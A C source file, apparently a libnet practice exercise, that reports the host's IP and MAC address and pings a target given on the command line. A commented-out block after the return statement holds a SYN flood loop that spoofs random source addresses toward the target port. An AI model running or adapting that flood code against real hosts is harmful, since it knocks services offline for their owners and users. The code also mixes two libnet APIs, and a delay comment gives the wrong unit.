#include <libnet.h>

#define FLOOD_DELAY 5000 // Delay between packet injects by 5000 ms.

/* Returns an IP in x.x.x.x notation */
char *print_ip(u_long *ip_addr_ptr)
{
    return inet_ntoa(*((struct in_addr *)ip_addr_ptr));
}

int main(int argc, char *argv[])
{
    //IPs
    u_long dest_ip, mi_ip;
    u_short dest_port;
    //MAC en formato string
    char *mac_addr_str = "08:00:27:0e:34:8d";
    //MAC Address
    struct libnet_ether_addr *mi_mac_addr;

    u_int8_t *ip_addr_p, *mac_addr;

    //Buffer para guardar los errores
    u_char errbuf[LIBNET_ERRBUF_SIZE];
    //Contexto
    libnet_t *l;

    if (argc < 3)
    {
        printf("Usage:\n%s\t <target host> <target port>\n", argv[0]);
        exit(1);
    }

    //Crea un contexto de libnet
    l = libnet_init(LIBNET_RAW4, NULL, errbuf);
    if (l == NULL)
    {
        fprintf(stderr, "libnet_init() failed: %s\n", errbuf);
        exit(EXIT_FAILURE);
    }

    //Obtiene mi IP
    /*
    libnet_addr2name4() will take the 4 bytes address in and return a string with its dotted decimal representation (e.g., 192.168.0.1) 
    if use_name is LIBNET_DONT_RESOLVE, or its DNS name (e.g., google.com) if use_name is LIBNET_RESOLVE.
    
    libnet_name2addr4() will do the exact opposite of libnet_addr2name4(), and will also need the libnet context as its first argument.
    */
    mi_ip = libnet_get_ipaddr4(l);
    if (mi_ip != -1)
        printf("My IP address: %s\n", libnet_addr2name4(mi_ip, LIBNET_DONT_RESOLVE));
    else
        fprintf(stderr, "Couldn't get own IP address: %s\n", libnet_geterror(l));

    //Obtiene mi MAC
    /*
    libnet_hex_aton() will take a string (int8_t* == char*) of two digits hexadecimal numbers separated by colons (e.g., 00:30:0A:67:A6:5C) and return that address in a u_int8_t array. 
    The array’s length is stored in len (for Ethernet, it’s usually 6). As we can see on man libnet-functions.h, libnet_hex_aton() implicitly calls malloc() and that memory needs to be 
    freed after you are done with it. Remember this.

    To accomplish the opposite effect of libnet_hex_aton() you can call printf with “%02X” for each byte, separating them with colons. We’ll do that in the following example.
    */
    mi_mac_addr = libnet_get_hwaddr(l);
    if (mi_mac_addr != NULL)
        printf("My MAC address: %02X:%02X:%02X:%02X:%02X:%02X\n",
               mi_mac_addr->ether_addr_octet[0],
               mi_mac_addr->ether_addr_octet[1],
               mi_mac_addr->ether_addr_octet[2],
               mi_mac_addr->ether_addr_octet[3],
               mi_mac_addr->ether_addr_octet[4],
               mi_mac_addr->ether_addr_octet[5]);
    else
        fprintf(stderr, "Couldn't get own MAC address: %s\n", libnet_geterror(l));

    //Obtiene la direccion IP destino
    dest_ip = libnet_name2addr4(l, argv[1], LIBNET_RESOLVE); // The host
    ip_addr_p = (u_int8_t *)(&dest_ip);
    char *ip_destino = malloc(16);
    sprintf(ip_destino, "%d.%d.%d.%d", ip_addr_p[0],
            ip_addr_p[1], ip_addr_p[2], ip_addr_p[3]);
    printf("Destination Address: %s\n", ip_destino);

    //y el puerto
    dest_port = (u_short)atoi(argv[2]); // The port
    if (ping(l, ip_destino) < 0)
    {
        libnet_destroy(l);
        exit(EXIT_FAILURE);
    }

    int length;
    mac_addr = libnet_hex_aton(mac_addr_str, &length);

    if (mac_addr != NULL)
    {
        printf("Address read: ");
        for (int i = 0; i < length; i++)
        {
            printf("%02X", mac_addr[i]);
            if (i < length - 1)
                printf(":");
        }
        printf("\n");

        // Remember to free the memory allocated by libnet_hex_aton()
        free(mac_addr);
    }

    /*
    Libnet makes available a build function for each type of header you may want to use in your packet. 
    As you might notice, some of these functions have a smaller version of themselves, called autobuild. The build functions will let you control every piece of information 
    the header will carry. Usually, however, you will only want to fill out the most important fields and let libnet handle the rest, therefore we have the autobuild functions.
    */

    libnet_destroy(l);

    return 0;

    /*
    u_char *packet;
    int opt, network, byte_count;

    int packet_size = LIBNET_IPV4_H + LIBNET_TCP_H;

    network = libnet_open_raw_sock(IPPROTO_RAW); // Open network interface.
    if (network == -1)
        libnet_error(LIBNET_ERR_FATAL, "can't open network interface. -- this program must run as root.\n");

    libnet_init_packet(packet_size, &packet); // Allocate memory for packet.
    if (packet == NULL)
        libnet_error(LIBNET_ERR_FATAL, "can't initialize packet memory.\n");

    libnet_seed_prand(); // Seed the random number generator.
    printf("SYN Flooding port %d of %s..\n", dest_port, print_ip(&dest_ip));

    while (1) // loop forever (until break by CTRL-C)
    {
        libnet_build_ip(LIBNET_TCP_H,                    // Size of the packet sans IP header.
                        IPTOS_LOWDELAY,                  // IP tos
                        libnet_get_prand(LIBNET_PRu16),  // IP ID (randomized)
                        0,                               // Frag stuff
                        libnet_get_prand(LIBNET_PR8),    // TTL (randomized)
                        IPPROTO_TCP,                     // Transport protocol
                        libnet_get_prand(LIBNET_PRu32),  // Source IP (randomized)
                        dest_ip,                         // Destination IP
                        NULL,                            // Payload (none)
                        0,                               // Payload length
                        packet);                         // Packet header memory
        libnet_build_tcp(libnet_get_prand(LIBNET_PRu16), // Source TCP port (random)
                         dest_port,                      // Destination TCP port
                         libnet_get_prand(LIBNET_PRu32), // Sequence number (randomized)
                         libnet_get_prand(LIBNET_PRu32), // Acknowledgement number (randomized)
                         TH_SYN,                         // Control flags (SYN flag set only)
                         libnet_get_prand(LIBNET_PRu16), // Window size (randomized)
                         0,                              // Urgent pointer
                         NULL,                           // Payload (none)
                         0,                              // Payload length
                         packet + LIBNET_IP_H);          // Packet header memory
        if (libnet_do_checksum(packet, IPPROTO_TCP, LIBNET_TCP_H) == -1)
            libnet_error(LIBNET_ERR_FATAL, "can't compute checksum\n");

        byte_count = libnet_write_ip(network, packet, packet_size); // Inject packet.
        if (byte_count < packet_size)
            libnet_error(LIBNET_ERR_WARNING, "Warning: Incomplete packet written. (%d of %d
                         bytes) ", byte_count, packet_size);
                usleep(FLOOD_DELAY); // Wait for FLOOD_DELAY milliseconds.
    }

    libnet_destroy_packet(&packet);           // Free packet memory.
    if (libnet_close_raw_sock(network) == -1) // Close the network interface.
        libnet_error(LIBNET_ERR_WARNING, "can't close network interface.");

    */
}

int ping(libnet_t *l, char *ip_addr_str)
{

    u_int32_t ip_addr;
    u_int16_t id, seq;
    char payload[] = "libnet :D";
    int bytes_written;

    /* Generating a random id */

    libnet_seed_prand(l);
    id = (u_int16_t)libnet_get_prand(LIBNET_PR16);

    /* Getting destination IP address */

    ip_addr = libnet_name2addr4(l, ip_addr_str, LIBNET_DONT_RESOLVE);

    if (ip_addr == -1)
    {
        fprintf(stderr, "Error converting IP address.\n");
        return -1;
    }

    /* Building ICMP header */

    seq = 1;

    if (libnet_build_icmpv4_echo(ICMP_ECHO, 0, 0, id, seq,
                                 (u_int8_t *)payload, sizeof(payload), l, 0) == -1)
    {
        fprintf(stderr, "Error building ICMP header: %s\n", libnet_geterror(l));
        return -2;
    }

    /* Building IP header */

    if (libnet_autobuild_ipv4(LIBNET_IPV4_H +
                                  LIBNET_ICMPV4_ECHO_H + sizeof(payload),
                              IPPROTO_ICMP, ip_addr, l) == -1)
    {
        fprintf(stderr, "Error building IP header: %s\n", libnet_geterror(l));
        return -3;
    }

    /* Writing packet */
    printf("Haciendo ping a %s\n", ip_addr_str);
    bytes_written = libnet_write(l);
    if (bytes_written != -1)
        printf("%d bytes written.\n", bytes_written);
    else
    {
        fprintf(stderr, "Error writing packet: %s\n", libnet_geterror(l));
        return -4;
    }

    return 0;
}